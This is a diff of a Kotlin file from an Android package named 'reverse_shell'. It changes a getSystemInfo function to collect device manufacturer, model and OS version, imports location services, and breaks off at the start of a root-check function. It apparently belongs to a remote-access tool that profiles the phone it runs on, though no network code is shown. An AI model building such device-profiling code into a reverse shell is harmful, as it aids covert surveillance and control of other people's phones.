@@ -1,31 +1,24 @@
 package com.ironclad.saksham.reverse_shell
 
-import android.annotation.SuppressLint
 import android.content.Context
 import android.location.Location
 import android.net.Uri
+import android.os.Build
 import com.google.android.gms.location.LocationServices
 import java.io.File
 
 fun getSystemInfo(): String {
-    val os = System.getProperty("os.name")
-    val osVersion = System.getProperty("os.version")
-    val osArch = System.getProperty("os.arch")
-    val user = System.getProperty("user.name")
-    val javaVersion = System.getProperty("java.version")
-    val runtimeMemory = Runtime.getRuntime().totalMemory()
-    val freeMemory = Runtime.getRuntime().freeMemory()
+    val manufacturer = Build.MANUFACTURER
+    val model = Build.MODEL
+    val sdk = Build.VERSION.SDK_INT
+    val versionRelease = Build.VERSION.RELEASE
 
     return """
-        System Information:
-        OS: $os
-        Version: $osVersion
-        Architecture: $osArch
-        User: $user
-        Java Version: $javaVersion
-        Total Memory: $runtimeMemory
-        Free Memory: $freeMemory
-    """.trimIndent()
+        Manufacturer: $manufacturer 
+        Model: $model 
+        SDK version: $sdk 
+        Android version: $versionRelease
+         """.trimIndent()
 }
 
 fun checkRoot(): String {
